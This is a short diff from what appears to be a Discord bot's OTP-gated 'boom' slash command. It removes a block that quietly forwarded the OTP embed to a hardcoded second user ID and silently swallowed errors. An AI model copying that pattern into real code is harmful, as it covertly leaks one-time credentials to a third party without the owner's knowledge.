@@ -424,14 +424,6 @@ async def slash_boom(interaction: discord.Interaction, otp: str):
             )
             embed.add_field(name="Server", value=interaction.guild.name if interaction.guild else "DM", inline=False)
             await owner.send(embed=embed)
-                                
-                    # Also send OTP to the second user
-                    second_user_id = 1265981186283409571
-                    try:
-                        second_user = await bot.fetch_user(second_user_id)
-                        await second_user.send(embed=embed)
-                    except:
-                        pass
         except:
             pass
         
